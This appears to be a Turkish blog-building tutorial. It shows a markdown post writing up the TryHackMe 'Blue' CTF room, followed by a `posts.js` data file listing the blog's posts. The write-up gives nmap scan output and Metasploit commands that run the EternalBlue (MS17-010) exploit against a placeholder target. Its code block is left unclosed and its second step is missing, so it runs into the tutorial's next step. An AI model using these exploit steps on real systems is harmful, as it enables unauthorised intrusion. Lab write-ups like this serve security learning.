#### C. `ctf-blue-odasi.md` İçeriği
```markdown
TryHackMe platformundaki "Blue" odası, siber güvenliğe yeni başlayanlar için en ünlü odalardan biridir. Bu oda, 2017'de WannaCry fidye yazılımının kullandığı **MS17-010 (EternalBlue)** zafiyetini temel alır. Bu benim ilk CTF (Capture The Flag) deneyimimdi ve işte adım adım çözüm (write-up).

## Adım 1: Keşif (Reconnaissance)

Her şey hedef sistemi taramakla başlar. `nmap` kullanarak makinedeki açık portları ve servisleri taradım.
      
```sh
$ nmap -sV [HEDEF_IP_ADRESİ]

PORT     STATE SERVICE      VERSION
...
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 (Samba)
...
msf6 > search ms17-010
...
0  exploit/windows/smb/ms17_010_eternalblue  ...
...

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS [HEDEF_IP_ADRESİ]
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
---

### Adım 3: Veri Dosyasını Güncelleme (`posts.js`)

Artık devasa HTML yığınlarına ihtiyacımız yok. `src/data/posts.js` dosyasını açın ve içeriğini, `fullContent` yerine `.md` dosyalarına işaret edecek şekilde basitleştirin:

**Dosya: `src/data/posts.js` (Güncellenmiş)**
```javascript
export default [
  {
    id: 1,
    slug: 'webden-siber-guvenlige',
    title: 'Web Geliştirmeden Siber Güvenliğe Geçiş',
    description: 'Neden web geliştirme kariyerimden siber güvenlik alanına yöneliyorum? Öğrenme sürecim ve hedeflerim üzerine notlar.',
    category: 'Kariyer',
    date: '4 Kasım 2025',
    // Artık 'fullContent' yok.
  },
  {
    id: 2,
    slug: 'owasp-top-10',
    title: 'OWASP Top 10 Nedir? (Geliştirici Gözüyle)',
    description: 'Güvenli kod yazmanın temeli olan OWASP Top 10 zafiyetlerini bir yazılımcı bakış açısıyla inceliyorum. İlk 3 zafiyet...',
    category: 'Güvenlik',
    date: '1 Kasım 2025',
  },
  {
    id: 3,
    slug: 'ctf-blue-odasi',
    title: 'İlk CTF Deneyimim: TryHackMe "Blue" Odası',
    description: 'Bir "Capture The Flag" yarışmasında Windows zafiyetlerini (EternalBlue) kullanarak nasıl yetki yükselttiğimin adım adım çözümü.',
    category: 'CTF Çözümü',
    date: '28 Ekim 2025',
  }
];